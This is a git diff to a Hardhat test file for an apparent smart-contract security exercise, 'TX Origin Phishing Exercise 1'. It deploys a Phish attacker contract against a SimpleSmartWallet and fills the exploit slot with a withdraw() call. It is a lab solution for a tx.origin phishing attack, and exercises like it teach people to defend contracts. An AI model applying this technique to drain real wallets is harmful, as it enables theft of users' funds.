@@ -4,6 +4,8 @@ import { BigNumber } from "ethers";
 import { parseEther } from "ethers/lib/utils";
 import { expect } from "chai";
 import {
+    Phish,
+    Phish__factory,
     SimpleSmartWallet,
     SimpleSmartWallet__factory,
 } from "../../typechain-types";
@@ -15,7 +17,8 @@ describe("TX Origin Phishing Exercise 1", function () {
     const CHARITY_DONATION = parseEther("0.1"); // 0.1 ETH
 
     let wallet: SimpleSmartWallet;
-    let attackerContract: any; // TODO - Replace "any" with your contract type
+
+    let attackerContract: Phish; // TODO - Replace "any" with your contract type
 
     let attackerInitialEthBalance: BigNumber;
 
@@ -35,6 +38,13 @@ describe("TX Origin Phishing Exercise 1", function () {
         wallet = await simpleSmartWalletFactory.deploy({
             value: HEDGE_FUND_DEPOSIT,
         });
+        const phishFactory = (await ethers.getContractFactory(
+            "contracts/tx-origin-phishing-1/Phish.sol:Phish",
+            attacker
+        )) as Phish__factory;
+        attackerContract = await phishFactory.deploy(
+            wallet.address
+        );
 
         let smartWalletBalance = await ethers.provider.getBalance(
             wallet.address
@@ -44,6 +54,7 @@ describe("TX Origin Phishing Exercise 1", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR SOLUTION HERE */
+        attackerContract.connect(attacker).withdraw()
     });
 
     after(async function () {
